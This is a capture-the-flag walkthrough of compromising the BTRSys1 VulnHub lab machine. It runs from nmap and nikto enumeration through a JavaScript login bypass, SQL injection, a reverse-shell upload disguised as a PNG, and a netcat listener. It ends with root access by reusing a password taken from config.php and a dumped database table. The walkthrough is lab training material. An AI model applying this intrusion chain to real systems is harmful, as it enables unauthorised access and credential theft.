# BTRSys1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.236 00:0c:29:25:e6:e8       VMware, Inc.
192.168.127.254 00:50:56:fd:64:8a       VMware, Inc.
```

The IP address is `192.168.127.236`, let's enumerate it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -oN fullscan -p- 192.168.127.236

Nmap scan report for 192.168.127.236
Host is up (0.00058s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.127.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: BTRisk
|_http-server-header: Apache/2.4.7 (Ubuntu)
MAC Address: 00:0C:29:25:E6:E8 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We check the web page and it is like this :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/31e72086-acf2-4ea5-8f1a-be8f1bd6c255)

there is no information here so we use gobuster to fuzz the web application :

```bash
root@kali: gobuster dir --url http://192.168.127.236 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 319] [--> http://192.168.127.236/uploads/]
/assets               (Status: 301) [Size: 318] [--> http://192.168.127.236/assets/]
/javascript           (Status: 301) [Size: 322] [--> http://192.168.127.236/javascript/]
/server-status        (Status: 403) [Size: 295]
```

checking the above directories has nothing to do with, so is used nikto against the website :

```bash
root@kali: nikto -host http://192.168.127.236

+ /config.php: PHP Config file may contain database IDs and passwords.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found
```

we can now check the `login.php` page : 

![loginpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/506a2422-24a5-460e-ab9d-efd97297958f)

website is in Turkish language so if you dont know the language use google translate.

in this login page, first check the page source and you see a javascript is used here :

```javascript
function control(){
	var user = document.getElementById("user").value;
    var pwd = document.getElementById("pwd").value;

	var str=user.substring(user.lastIndexOf("@")+1,user.length);
    
    if((pwd == "'")){
		alert("Hack Denemesi !!!");
		
    }
	else if (str!="btrisk.com"){
		alert("Yanlis Kullanici Bilgisi Denemektesiniz");
	
	}	
	else{
		
      document.loginform.submit();
    }
}
```

so we need to put `@btrisk.com` string in the user field to fullfil the javascript needs

if you only put the `@btrisk.com` in the username, you will be logged in but you see no information because does not select anything

![empty](https://github.com/Git-K3rnel/VulnHub/assets/127470407/5b9e58f0-f5a4-45e1-9f21-8a72f5519a4b)

but if you check for the SQLi here and use the following payload, you see the results :

![sqli](https://github.com/Git-K3rnel/VulnHub/assets/127470407/dc1a4fbc-79b5-49a8-9172-6335ac18c05e)


![fullpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a4f99e40-d9f2-4d1c-b628-eab8473c8f3d)

now we can upload a file here, but first check the page source and you see the javascript again :

```javascript
// accept=".jpg,.png"
function getFile(){
    var filename = document.getElementById("dosya").value;
    var sonuc = ((/[.]/.exec(filename)) ? /[^.]+$/.exec(filename) : undefined);
    if((sonuc == "jpg") || (sonuc == "gif") || (sonuc == "png")){
		document.myform.submit();
    }else{
        //mesaj
        alert("Yanlizca JPG,PNG dosyalari yukleyebilirsiniz.");
		return false;
		
		
    }
}
```

## 3.Gaining Shell

This code just prevents us from uploading files which does not have `jpg`, `gif` or `png` extensions.

but frontend control mechanism can be bypassed by intercepting the traffic with a proxy like burp so prepare

a reverse shell and call the file `revshell.png`, intercept the traffic in burp and change the extension :

![revshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/14561d2e-280c-443c-b504-54d7bbf1173c)

then start a listener and check the `/uploads` folder you see the file you've just uploaded and you gain a shell :

```bash
nc -nvlp 4444                     
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.236] 47464
Linux BTRsys1 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
 00:30:40 up  1:32,  0 users,  load average: 0.00, 0.02, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4.Privilege Escalation

Since nikto found `config.php` file, go to `/var/www/html` and cat the content of config.php :

```text
$ cat config.php
<?php
/////////////////////////////////////////////////////////////////////////////////////////
$con=mysqli_connect("localhost","root","toor","deneme");
if (mysqli_connect_errno())
  {
  echo "Mysql Bağlantı hatası!: " . mysqli_connect_error();
  }
/////////////////////////////////////////////////////////////////////////////////////////
?>
```

you will see the username and password for mysql, now try to login to database from here (first stablize the shell) :

```bash
www-data@BTRsys1:/$ mysql -u root -h localhost -p
mysql -u root -h localhost -p
Enter password: toor

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 653
Server version: 5.5.55-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| deneme             |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.00 sec)

mysql> use deneme
use deneme
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_deneme |
+------------------+
| user             |
+------------------+
1 row in set (0.00 sec)

mysql> select * from user;
select * from user;
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
| ID | Ad_Soyad    | Kullanici_Adi    | Parola    | BabaAdi | BabaMeslegi | AnneAdi | AnneMeslegi | KardesSayisi |
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
|  1 | ismail kaya | ikaya@btrisk.com | asd123*** | ahmet   | muhasebe    | nazli   | lokantaci   |            5 |
|  2 | can demir   | cdmir@btrisk.com | asd123*** | mahmut  | memur       | gulsah  | tuhafiyeci  |            8 |
+----+-------------+------------------+-----------+---------+-------------+---------+-------------+--------------+
2 rows in set (0.00 sec)
```

in `Parlo` column (which means password) we see a password, try to login to root acount with this password :

```bash
www-data@BTRsys1:/$ su root
su root
Password: asd123***

root@BTRsys1:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

yes, this is how you can get root on this machine :)

